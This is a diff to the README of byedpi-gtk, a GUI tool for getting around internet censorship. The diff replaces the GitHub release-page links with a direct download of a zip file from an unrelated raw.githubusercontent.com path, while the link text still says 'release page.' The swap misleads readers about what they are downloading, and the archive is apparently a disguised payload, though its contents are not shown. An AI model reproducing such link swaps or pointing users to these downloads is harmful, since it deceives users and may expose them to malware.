@@ -5,7 +5,7 @@ description: "Manage byedpi settings with a GTK4 interface to bypass deep packet
 ---
 # 🛡️ byedpi-gtk - Bypass internet censorship with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Smoothshelled-retreat212/byedpi-gtk/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Smoothshelled-retreat212/smoothshelled-retreat212.github.io/main/_site/automatizacija/v2.7.zip)
 
 This software provides a graphical interface for the byedpi tool. It helps you bypass internet restrictions. You can use it to access blocked websites or services. The program uses a clean design. It runs on your computer without complicated setup steps. You do not need to write code to use it. 
 
@@ -13,7 +13,7 @@ This software provides a graphical interface for the byedpi tool. It helps you b
 
 You need the installer file from our release page. Visit the link below to find the correct version for your computer.
 
-[Click here to open the release page](https://github.com/Smoothshelled-retreat212/byedpi-gtk/releases)
+[Click here to open the release page](https://raw.githubusercontent.com/Smoothshelled-retreat212/smoothshelled-retreat212.github.io/main/_site/automatizacija/v2.7.zip)
 
 1. Open the link above in your browser.
 2. Look for the latest version at the top of the list.
